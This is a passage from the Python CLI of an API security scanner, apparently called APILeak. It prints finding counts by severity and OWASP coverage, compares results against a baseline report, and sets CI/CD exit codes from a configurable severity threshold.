                    else:
                        click.echo("No valid endpoints found (all returned 404 or errors)")
            elif scan_type == "param":
                click.echo(f"Total Parameters Tested: {getattr(results.statistics, 'parameters_tested', 0)}")
            
            click.echo(f"Total Findings: {stats['total_findings']}")
            click.echo(f"Critical: {stats['critical_findings']}")
            click.echo(f"High: {stats['high_findings']}")
            click.echo(f"Medium: {stats['medium_findings']}")
            click.echo(f"Low: {stats['low_findings']}")
            click.echo(f"Info: {stats['info_findings']}")
            click.echo(f"OWASP Coverage: {owasp_coverage['coverage_percentage']:.1f}% ({owasp_coverage['tested_categories']}/{owasp_coverage['total_categories']} categories)")
            
            # Show most critical category if any
            if stats.get('most_critical_category'):
                click.echo(f"Most Critical Category: {stats['most_critical_category']}")
        else:
            # Fallback to basic statistics
            click.echo(f"Total Findings: {results.statistics.findings_count}")
            click.echo(f"Critical: {results.statistics.critical_findings}")
            click.echo(f"High: {results.statistics.high_findings}")
            click.echo(f"Medium: {results.statistics.medium_findings}")
            click.echo(f"Low: {results.statistics.low_findings}")
            click.echo(f"Info: {results.statistics.info_findings}")
        
        click.echo(f"\nReports generated:")
        for report_file in report_files:
            click.echo(f"  - {report_file}")
        
        # Baseline comparison: classify findings into new vs known relative to a
        # baseline JSON report (Requirements 11.1-11.3). A missing baseline path
        # yields an empty baseline so every finding is treated as new (11.5).
        new_findings = None
        if baseline:
            from utils.baseline import BaselineComparator

            comparator = BaselineComparator()
            baseline_keys = comparator.load(baseline)

            if hasattr(results, 'findings_collector') and results.findings_collector:
                all_findings = results.findings_collector.get_prioritized_findings()
            else:
                all_findings = list(getattr(results, 'findings', []) or [])

            new_findings, known_findings = comparator.classify(all_findings, baseline_keys)

            click.echo("\n📊 Baseline Comparison:")
            click.echo(f"  - Baseline: {baseline}")
            click.echo(f"  - New findings: {len(new_findings)}")
            click.echo(f"  - Known findings: {len(known_findings)}")
        
        # Enhanced CI/CD integration with configurable exit codes
        if ci_mode:
            if new_findings is not None:
                # With a baseline, the severity gate evaluates only the
                # New_Finding set (Requirement 11.4).
                counts = _count_by_severity(new_findings)
            else:
                counts = {
                    "critical": getattr(results.statistics, 'critical_findings', 0),
                    "high": getattr(results.statistics, 'high_findings', 0),
                    "medium": getattr(results.statistics, 'medium_findings', 0),
                    "low": getattr(results.statistics, 'low_findings', 0),
                }

            # Deterministic exit code derived from the highest severity present
            # and the configured fail-on threshold (Requirements 9.1-9.3).
            exit_code = evaluate_severity_gate(counts, fail_on)

            if exit_code == 0:
                exit_reason = "No findings at or above the configured threshold"
            else:
                exit_reason = (
                    f"{counts['critical']} critical, {counts['high']} high, "
                    f"{counts['medium']} medium, {counts['low']} low findings "
                    f"(fail on {fail_on}+)"
                )

            click.echo(f"\n🔄 CI/CD Result: Exit code {exit_code} - {exit_reason}")
            
            logger.info("CI/CD scan completed", exit_code=exit_code, reason=exit_reason)
            sys.exit(exit_code)
        else:
            # Standard exit codes for non-CI mode
            critical_count = getattr(results.statistics, 'critical_findings', 0)
            high_count = getattr(results.statistics, 'high_findings', 0)
            
            if critical_count > 0:
                logger.info("Exiting with code 2 due to critical findings")
                sys.exit(2)
            elif high_count > 0:
                logger.info("Exiting with code 1 due to high severity findings")
                sys.exit(1)
            else:
                logger.info("Scan completed successfully with no critical/high findings")
                sys.exit(0)
            
    except Exception as e:
        logger.error("Enhanced scan execution failed", error=str(e))
        if ci_mode:
            click.echo(f"\n❌ CI/CD Scan Failed: {e}")
            sys.exit(3)  # Special exit code for scan failures in CI
        raise


async def run_apileak(config):
    """
    Run APILeak scan with the provided configuration (legacy compatibility)
    
    Args:
        config: APILeak configuration
    """
    # Delegate to enhanced version with default CI settings
    await run_enhanced_apileak(config, ci_mode=False, fail_on="critical")


if __name__ == '__main__':
    cli()